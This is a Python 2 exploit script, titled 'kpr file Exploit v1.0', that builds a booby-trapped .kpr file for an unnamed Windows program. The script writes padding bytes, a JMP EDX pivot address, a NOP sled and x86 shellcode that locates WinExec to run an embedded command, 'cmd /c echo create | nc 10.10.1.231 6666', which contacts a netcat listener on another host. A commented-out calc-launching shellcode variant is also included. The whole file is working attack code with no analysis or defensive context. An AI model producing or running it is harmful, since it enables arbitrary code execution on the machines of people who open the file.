from sys import argv
import struct

print " ====================================== "
print " # kpr file ###  Exploit v1.0  ### "
print " ====================================== "
print " [+] Making kpr file..."
print " ====================================== "



if __name__ == "__main__":

	##############################################
	
	f = open("Performance_Enhanced_test.kpr","w")
	
	kprdirA = (b'\x02\x81\x01\x00\x12\x00\x1E\x41\x41\x41\xF5\x44\x44\x44\x44\x44\x44\x44\x44\x44\x44\x6A\x44\x44\x44\x44\x41\x41\x41\x4C\x44\x44\x44\x44\x44\x44\x54\x1E\x44\x44\x44\x44\x44\x44\x44\x44\x44\x44\x44\x44\x44\x44\x44\x44\x41\x41\x34\x44\x44\x44\x44\x44\x44\x44\x44\x44\x44\x44\x1E\x44\x44\x44\x44\x41\x65\x41\x41\x36\x41\xBD\x44\x44\x44\x44\x41\x95\x41\x41\xDD\x44\x44\x44\x44\x44\x44\x44\x44\x44\x44\x1E\x8A\x44\x44\x44\x44\x44\x44\x44\x44\x44\x44\x44\x44\x44\x44\x44\x44\x44\x44\x44\x44\x44\x44\x44\x44\x15\x44\x44\x44\x44\x00\x00\x02\x80\x00\x00\x12\x00\x00\xB2\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x41\x41\x41\x37\x55\x55\x55\x55\x55\x55\x55\x55\x41\x41\x1E\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x41\x41\x41\x22\x55\x55\x55\x55\x41\x41\x1E\x77\x77\x77\x77\x77\x77\x77\x77\x77\x77\x77\x77\x77\x77\x41\x41\x41\x41\x42\x42\x42\x42\x43\x43\x43\x43\x44\x44\x44\x44\x1E\x41\x41\x41\xDC\x45\x45\x45\xAC\xF5\x18\x00\x41\x41\x41\xA8\x47\x47\x47\x47')
	
	#check = struct.pack('<L',0x48484848)    	# Step1 : Stack pivot
	#pivot = struct.pack('<L',0x0040228f)    	# Step1 : Stack pivot 8

	pivot = struct.pack('<L', 0x00402333)		# JMP edx (shellcode address)

	# CMD: cmd /c echo STOP$ > "C:\Users\Admin\CONTROL_CMD.txt"
	cmd = b'\x41\x41\x41\x41'	# pad
	cmd += b'cmd /c echo create | nc 10.10.1.231 6666'
	cmd += b'\x20\x20\x20\x20'
	cmd += b'\x20\x20\x20\x20'
	cmd += b'\x20\x20\x20\x20'
	cmd += b'\x00\x42\x42\x42'	# pad, 60 bytes
	kprdirB = cmd
	kprdirB += b'\xAD\x00\x0E\x00\x01\x8A\x00\x0E\x00\x01\x40\x00\x0E\xC7\x01\x40\x00\x0E\x00\x01\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x90\x90\x90'

	kprdirC = (b'\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x42\x42\x42\x42\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90')

	##############################################
	
	# 0x7D7EF998 jmp >> 7805ffff

	# orig 74 -> 84

	shellcode = b''
	shellcode += b'\x31\xd2\x52'	# xor edx, edx; push edx
	shellcode += b'\x83\xC4\x04'	# add esp, 4
	shellcode += b'\x89\xE6\x31\xD2\x83\xC2\x05\x52\x31\xD2\x90\x56\x64\x8B\x72\x30\x8B\x76\x0C\x8B\x76\x0C\xAD\x8B\x30\x8B\x7E\x18\x8B\x5F\x3C\x8B\x5C\x1F\x78\x8B\x74\x1F\x20\x01\xFE\x8B\x4C\x1F\x24\x01\xF9\x42\xAD\x81\x3C\x07\x57\x69\x6E\x45\x75\xF5\x0F\xB7\x54\x51\xFE\x8B\x74\x1F\x1C\x01\xFE\x03\x3C\x96\xFF\xD7'
	
	#shellcode = calc = (b'\x31\xD2\x52\x68\x63\x61\x6C\x63\x89\xE6\x31\xD2\x83\xC2\x05\x52\x31\xD2\x90\x56\x64\x8B\x72\x30\x8B\x76\x0C\x8B\x76\x0C\xAD\x8B\x30\x8B\x7E\x18\x8B\x5F\x3C\x8B\x5C\x1F\x78\x8B\x74\x1F\x20\x01\xFE\x8B\x4C\x1F\x24\x01\xF9\x42\xAD\x81\x3C\x07\x57\x69\x6E\x45\x75\xF5\x0F\xB7\x54\x51\xFE\x8B\x74\x1F\x1C\x01\xFE\x03\x3C\x96\xFF\xD7')
	
	payload = kprdirA + pivot + kprdirB + shellcode + kprdirC
	
	print " [+] Payload size : ", len(payload)
	print " ====================================== "
	f.write(payload)
	f.flush()
	f.close()
